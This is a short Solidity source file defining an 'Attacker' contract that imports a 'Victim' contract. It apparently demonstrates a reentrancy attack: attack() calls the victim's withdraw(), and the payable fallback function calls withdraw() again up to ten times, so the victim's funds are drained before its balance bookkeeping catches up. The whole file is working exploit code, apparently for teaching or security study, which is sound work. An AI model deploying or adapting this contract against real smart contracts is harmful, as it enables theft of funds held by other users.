pragma solidity ^0.4.8;

import './Victim.sol';

contract Attacker {
  Victim v;
  uint public count;

  event LogFallback(uint c, uint balance);

  function Attacker(address victim) {
    v = Victim(victim);
  }

  function attack() {
    v.withdraw();
  }

  function () payable {
    count++;
    LogFallback(count, this.balance);
    if (count < 10) {
      v.withdraw();
    }
  }
}